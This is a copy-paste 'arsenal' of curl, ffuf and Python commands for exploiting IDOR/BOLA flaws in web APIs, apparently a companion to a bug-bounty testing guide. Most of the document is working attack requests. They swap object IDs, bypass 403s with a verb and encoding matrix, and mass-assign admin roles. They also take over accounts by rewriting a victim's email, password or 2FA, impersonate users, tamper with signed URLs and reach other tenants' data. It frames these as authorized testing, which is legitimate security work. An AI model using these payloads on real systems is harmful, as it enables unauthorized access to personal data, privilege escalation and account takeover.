# IDOR / BOLA Attack Arsenal — Copy-Paste Payloads, ID-Mutation Matrix & Two-Account Workflow

> Companion to `IDOR_TESTING_GUIDE.md`. **Pick by where the reference lives and what guards it** (guide §5/§8). Replace `<A_TOKEN>`/`<B_TOKEN>` (your two test accounts), `<B_ID>` (victim object/user id), `target.com`. **Authorized targets only; both accounts must be yours; prove the pattern with a SMALL set, never dump real PII** (guide §25).
>
> **Workflow:** two accounts A & B (§1) → map references (§3) → swap B's reference into A's request (§4) → if blocked, run the mutation matrix (§8) → escalate (read→enumerate→write→ATO→BFLA→RCE, §11–§17).

---

## A. Set once
```bash
export T=https://target.com
export A='Authorization: Bearer <A_TOKEN>'      # attacker (you)
export B='Authorization: Bearer <B_TOKEN>'      # victim (also you)
export BID=124                                   # an object/user id owned by B
# (cookie auth: use  -H "Cookie: session=<A>"  instead of the bearer header)
```

## B. The core test — A's creds, B's object (guide §4)
*What & when:* the one test the whole class reduces to — walk in as A, ask for B's object. Run it first on every reference. The three outcomes (B's data / 403-404 / your own data) tell you exactly whether to report, bypass, or move on.
```bash
# 1) Baseline: A reads A's own object (works, 200, A's data)
curl -s "$T/api/orders/7001" -H "$A" | jq .
# 2) The IDOR test: A reads B's object
curl -s "$T/api/orders/8001" -H "$A" | jq .
#    200 + B's data  → IDOR-READ confirmed
#    403/404         → run section H (bypass matrix)
#    A's own data    → SAFE (session-scoped), move on
```

## C. Autorize (Burp) — whole-app coverage
```
Burp → Extensions → Autorize. Set the "low-privilege" identity = B's headers:
   Authorization: Bearer <B_TOKEN>      (or Cookie: session=<B>)
Add a 2nd "unauthenticated" identity = no auth header.
Turn Autorize ON, browse the whole app AS A.
→ Autorize replays every request as B (and unauth) and flags:
   "Bypassed!"  = B got A's resource (or unauth got it) → IDOR/BOLA
   "Enforced!"  = properly blocked
Verify each "Bypassed!" by hand (guide §19) before reporting.
```

## D. Decode / mutate encoded IDs (guide §5.2/§6.2)
*What & when:* whenever the ticket number *looks* random. Most "random" ids are a sequential number wearing a costume — base64, a hash, or a reversible obfuscator (Hashids/Sqids/Optimus) whose salt sits in the front-end JS. Decode it, and mass enumeration is back on the table.
```bash
echo -n 'MTIz' | base64 -d            # → 123      (base64 id)
echo -n 'user_123' | base64           # re-encode after incrementing
python3 -c "print(hex(124))"          # hex ids
# md5/sha of small ints (weakly-hashed PKs):
python3 -c "import hashlib;print(hashlib.md5(b'124').hexdigest())"
# Mongo ObjectId: first 8 hex = unix timestamp
python3 -c "print(int('65a1f2c0',16))"
# Hashids / Sqids — alphabet+salt are usually in the front-end JS (grep the bundle for
# 'Hashids'/'Sqids'/'salt'/the alphabet); default salt decodes with any library:
python3 -c "from hashids import Hashids; print(Hashids(salt='SALT_FROM_JS').decode('yr8'))"   # -> (123,)
#   Sqids:  pip install sqids ;  Sqids(alphabet='...').decode('JR')
#   recognise: short alnum that drifts IN ORDER as you create objects (gY6,J4Q,oE2) => reversible (§6.6)
# Optimus (Knuth multiplicative): encoded=(id*PRIME) XOR RAND mod 2^31 — read PRIME/INVERSE/RAND from
#   JS/config (or recover from a few (realId,encoded) pairs) -> it's a bijection -> decode/enumerate.
# ULID (Crockford base32): first 10 chars = 48-bit ms timestamp; UUIDv7: first 48 bits = unix ms.
python3 -c "print(int('018f5a2c',16), '= high time bits of a v7/ULID id; set to B\\'s creation window (§7.5)')"
```

## E. Sequential enumeration (POLITE, small proof set) (guide §6/§25)
```bash
# ffuf over an id path — LOW rate, your-own + 2nd-account range only for the PoC:
ffuf -u "$T/api/users/FUZZ" -H "$A" -w <(seq 120 130) -rate 5 -mc 200 -of json -o idor.json
# Burp Intruder: Sniper on the id, payload type Numbers 1..N, throttle; sort by length/status.
# State the POPULATION from the server, don't scrape it:
curl -sI "$T/api/users?limit=1" -H "$A" | grep -i 'X-Total-Count\|x-total'
```

## F. JSON / body reference swap (guide §5.1)
```bash
curl -s -X POST "$T/api/invoice/view" -H "$A" -H 'Content-Type: application/json' \
  -d "{\"invoiceId\": $BID}"
# nested / arrays:
-d "{\"invoice\":{\"id\": $BID}}"
-d "{\"ids\":[ $BID ]}"
```

## G. Header / cookie trust (high hit-rate) (guide §5.1/§8.9)
```bash
curl -s "$T/api/me/orders" -H "$A" -H "X-User-Id: $BID"
curl -s "$T/api/me"        -H "$A" -H "X-Account-Id: $BID"
curl -s "$T/dashboard"     -H "Cookie: session=<A>; uid=$BID"
# 'internal' header trust:
-H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /admin"
```

## H. The ID-mutation / bypass matrix (run when the swap returns 403/404) (guide §8)
*What & when:* your response to a "no." The app usually guards one door and forgets the side doors — a different verb, the `.json` version, the old `/v1/`, a bracket-wrapped id, or a child id under your own parent. Fire the matrix before ever concluding "protected"; one row opens a large share of 403 endpoints.
```bash
ID=$BID
# 1) METHOD / VERB swap (GET guarded, others not)
for M in GET POST PUT PATCH DELETE; do echo "== $M"; curl -s -o /dev/null -w "%{http_code}\n" -X $M "$T/api/users/$ID" -H "$A"; done
curl -s "$T/api/users/$ID" -H "$A" -H 'X-HTTP-Method-Override: PUT'
curl -s "$T/api/users/$ID?_method=PUT" -H "$A"

# 2) ARRAY-WRAP & PARAMETER POLLUTION
curl -s "$T/api/users?id[]=$ID" -H "$A"
curl -s "$T/api/users?id=$MY_ID&id=$ID" -H "$A"        # first/last wins
curl -s -X POST "$T/api/users" -H "$A" -H 'Content-Type: application/json' -d "{\"id\":$MY_ID,\"id\":$ID}"

# 3) TYPE JUGGLING
curl -s "$T/api/users/$ID" -H "$A"                      # int
curl -s "$T/api/users/\"$ID\"" -H "$A"                  # string
curl -s -X POST "$T/api/users" -H "$A" -d "{\"id\":[$ID]}"           # array
curl -s -X POST "$T/api/users" -H "$A" -d "{\"id\":{\"\$ne\":null}}"  # NoSQL operator

# 4) PATH / ENCODING / EXTENSION / VERSION
curl -s "$T/api/users/$ID.json" -H "$A"
curl -s "$T/api/users/$ID/" -H "$A"
curl -s "$T/api/users/%32%34" -H "$A"                   # %-encoded
curl -s "$T/api/v1/users/$ID" -H "$A"                   # OLD version unguarded
curl -s "$T/internal/users/$ID" -H "$A"

# 5) WILDCARD / NULL / BOUNDARY
for V in 0 -1 '*' '%' all me current null; do curl -s -o /dev/null -w "$V=%{http_code}\n" "$T/api/users/$V" -H "$A"; done

# 6) 403-vs-404 ENUMERATION ORACLE (record status AND length AND time)
for i in $(seq 1 50); do curl -s -o /dev/null -w "$i %{http_code} %{size_download} %{time_total}\n" "$T/api/users/$i" -H "$A"; done

# 7) NESTED / PARENT-SCOPED CHILD — keep YOUR parent, swap only the child (very common) (§8.10)
curl -s "$T/api/users/$MY_ID/cards/$ID"      -H "$A"     # my user, B's card
curl -s "$T/api/orders/$MY_ORDER/items/$ID"  -H "$A"     # my order, not-my line item
curl -s "$T/api/projects/$MY_PROJ/members/$ID" -H "$A"   # my project, B's member record

# 8) BULK / BATCH id-mixing — server checks first/none, acts on the whole array (§8.11)
curl -s -X POST "$T/api/users/batch" -H "$A" -H 'Content-Type: application/json' -d "{\"ids\":[$MY_ID,$ID]}"
curl -s "$T/api/messages?ids=$MY_ID,$ID" -H "$A"
```

## I. Mass assignment / owner-field tampering (guide §9) — BOPLA → ATO/priv-esc
```bash
# Reassign ownership / cross to victim or tenant:
curl -s -X PUT "$T/api/orders/7001" -H "$A" -H 'Content-Type: application/json' \
  -d "{\"items\":[1],\"owner_id\":$BID}"
# Self-promote (mass-assign role/flags):
curl -s -X PATCH "$T/api/users/me" -H "$A" -H 'Content-Type: application/json' \
  -d '{"role":"admin","isAdmin":true,"is_staff":true,"verified":true,"permissions":["*"]}'
# Discover field names from the GET response or GraphQL __type, then assign them.
# JSON-Patch (RFC 6902) / merge-patch — frequently a SEPARATE, less-guarded code path (§9.4):
curl -s -X PATCH "$T/api/users/me" -H "$A" -H 'Content-Type: application/json-patch+json' \
  -d "[{\"op\":\"replace\",\"path\":\"/role\",\"value\":\"admin\"},{\"op\":\"replace\",\"path\":\"/owner_id\",\"value\":$BID}]"
curl -s -X PATCH "$T/api/orders/7001" -H "$A" -H 'Content-Type: application/merge-patch+json' \
  -d "{\"owner_id\":$BID,\"price\":0}"
```

## J. Write IDOR → Account Takeover (guide §12)
*What & when:* the escalation that turns a read into a paycheck — point a write at the victim's recovery email, reset, and log in as them. Always finish with the "verify as B" line; a 200 is not proof the change landed.
```bash
# Change victim's recovery email (A's creds, B's id) → reset → own the account:
curl -s -X PUT "$T/api/users/$BID/email" -H "$A" -H 'Content-Type: application/json' \
  -d '{"email":"victim+idor@your-inbox.test"}'
# Direct password / MFA / key (endpoints not requiring old secret):
curl -s -X POST "$T/api/users/$BID/password" -H "$A" -d '{"new":"Pwn3d-test!"}'
curl -s -X POST "$T/api/users/$BID/2fa/disable" -H "$A"
curl -s -X POST "$T/api/users/$BID/apikeys" -H "$A" -d '{"name":"x"}'
# THEN verify the change as B (re-read as B) — a 200 is not proof (guide §4.2/§19):
curl -s "$T/api/users/$BID" -H "$B" | jq '.email'
```

## K. BFLA — function-level (guide §10/§13) — usually Critical
*What & when:* when the target is an *action*, not an object — replay an admin-only operation as your normal user A. The web UI hides the button but the API often skips the rank check. Self-promote, create an admin, or impersonate; almost always Critical. Use your own objects for anything destructive.
```bash
curl -s -X POST  "$T/api/admin/users"           -H "$A" -d '{"email":"a@a.t","role":"admin"}'
curl -s -X PATCH "$T/api/users/me"              -H "$A" -d '{"role":"admin"}'
curl -s -X POST  "$T/api/users/$BID/impersonate" -H "$A"
curl -s -X DELETE "$T/api/orders/8001"          -H "$A"          # destructive cross-user (own objects only!)
# Route/method variants if /admin/ is blocked:
curl -s "$T/api/v1/admin/users" -H "$A"; curl -s "$T/admin/api/users" -H "$A"
```

## L. Files / exports / signed URLs (guide §14)
```bash
curl -s "$T/download?file=invoice_8001.pdf" -H "$A" -o b.pdf      # swap filename id
curl -s "$T/exports/$BID.csv" -H "$A"                              # bulk export by id
curl -s "$T/attachments/$BID" -H "$A"
# Signed URL: try removing/altering the signature, swapping the key, tampering content-disposition:
curl -s "$T/s3/uploads/$BID/file.pdf"                              # CDN serves without auth?
curl -s "$T/files?key=uploads/$BID/secret.pdf&X-Amz-Signature=..."  # drop/alter sig
```

## M. GraphQL IDOR / BOLA (guide §15 → full kit API/GraphQL/)
```bash
# node(id:) — decode/iterate/encode global ids
python3 -c "import base64;print(base64.b64encode(b'User:124').decode())"   # VXNlcjoxMjQ=
curl -s "$T/graphql" -H "$A" -H 'Content-Type: application/json' \
  -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone } } }"}'
# alias batching — many objects in one request:
curl -s "$T/graphql" -H "$A" -H 'Content-Type: application/json' \
  -d '{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}'
# write/BFLA via mutation:
  -d '{"query":"mutation{ updateUser(id:124,input:{email:\"victim+idor@your-inbox.test\"}){id} }"}'
```

## N. Cross-tenant (SaaS) (guide §16)
```bash
# Authenticated to tenant-1, reach tenant-2's objects (two orgs you own):
curl -s "$T/api/workspaces/<TENANT2>/projects" -H "$A"
curl -s "$T/api/projects/<T2_PROJECT_ID>" -H "$A"
curl -s "$T/api/me/data" -H "$A" -H "X-Tenant-Id: <TENANT2>"
# subdomain-routed tenants:
curl -s "https://tenant2.target.com/api/data" -H "$A"
```

## O. Two-account diff (confirm fast, low-FP) (guide §25.2)
```bash
# A-with-B's-id vs B's own response: identical (minus volatile fields) = IDOR
curl -s "$T/api/orders/$BID" -H "$A" | jq -S 'del(.timestamp,.csrf)' > a_view.json
curl -s "$T/api/orders/$BID" -H "$B" | jq -S 'del(.timestamp,.csrf)' > b_view.json
diff a_view.json b_view.json && echo "IDENTICAL → IDOR (A sees B's object)"
```

## P. Validity checklist (paste into every IDOR test) (guide §19)
```
[ ] TWO accounts I own (A=attacker, B=victim), SAME role.
[ ] Request used A's creds (show the header).
[ ] Reference pointed at B's object (show the id).
[ ] Response contained B's data, OR B's object verifiably changed (re-read as B).
[ ] Server has NO ownership check (A's request with B's id succeeds where it must not).
[ ] Impact stated: read/single · mass/PII · write/ATO · BFLA/admin · cross-tenant.
[ ] Small proof set; writes reverted; no real-user data touched.
```

## Q. ID format → attack quick-map
```
sequential int / gappy     → increment/decrement + ranged enum (politely)          §6.1
base64 / hex / url-enc     → decode → mutate → re-encode                            §6.2
md5/sha of int             → precompute hash space                                   §6.3
UUIDv1                     → predict (time+MAC); sandwich attack                     §7.1
Mongo ObjectId (24-hex)    → timestamp+counter predictable; fuzz random bytes        §7.2
snowflake / big time-int   → bounded by creation window                              §7.3
UUIDv4 (random)            → OBTAIN it (list/search/profile/GraphQL/Referer/error)   §7.4
uuidv7 / ulid / ksuid      → timestamp-prefixed; bound to creation window; sort+iterate §7.5
hashids / sqids            → find salt/alphabet in JS (or default) → decode → enumerate §6.6
optimus (knuth)            → recover PRIME/INVERSE (JS or a few pairs) → decode bijection §6.6
composite / signed         → tamper each part; test signature enforcement           §5.2
nested child / parent-scope→ keep YOUR parent, swap the child id                     §8.10
bulk / batch               → mix your id with the victim's in the array/CSV          §8.11
```

## R. Real-world IDOR/BOLA chains & references
```
First American Financial (2019)  — sequential document id → 885M sensitive docs (mass read).
T-Mobile API (2023)              — BOLA on an API → ~37M customer records.
Optus (2022)                     — unauth API enumeration of customer PII.
Peloton API (2021)               — BOLA returned account data for any user.
USPS Informed Visibility (2018)  — API exposed ~60M users' data (no object check).
Parler (2021)                    — sequential post ids → bulk scrape.
Uber (2019)                      — leaked UUID + IDOR → full account takeover.
GitLab                           — multiple BOLA / access-control CVEs (issues, notes, runners, etc.).
Bumble / Tinder                  — geolocation IDOR → precise location of any user.
Pattern: find reference → no ownership check → ENUMERATE / WRITE → mass PII / ATO / cross-tenant.
Refs: OWASP API1/3/5 (BOLA/BOPLA/BFLA), PortSwigger Access Control, CWE-639/285/863/566/915;
      hashids.org / sqids.org (encodings, not security); RFC 9562 (UUIDv7) / ulid spec.
```
